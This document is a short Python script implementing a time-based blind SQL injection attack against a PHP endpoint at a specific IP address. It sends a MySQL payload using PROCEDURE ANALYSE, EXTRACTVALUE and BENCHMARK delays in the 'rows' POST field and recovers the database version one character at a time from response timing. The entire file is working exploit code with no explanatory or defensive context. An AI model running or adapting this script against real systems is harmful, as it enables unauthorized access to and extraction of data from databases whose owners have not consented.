import requests
import time

url='http://101.198.180.155/bin/sms.php'
payload='1 PROCEDURE ANALYSE(EXTRACTVALUE(3003,CONCAT(0x5c,(IF((ascii(MID((select version()),{},1))={}),BENCHMARK(10000000,MD5(0x4c4c6775)),3003)))),1)'
data={'page': '1', 'rows': ''}

char=''
for i in range(1,200):
    for j in range(32,128):
        data['rows']=payload.format(i,j)
        # print(data['rows'])
        t=time.time()
        requests.post(url,data)
        # print(time.time()-t)
        if time.time()-t>1:
            char+=chr(j)
            print(chr(j))
            break
    if j==127:
        break
print(char)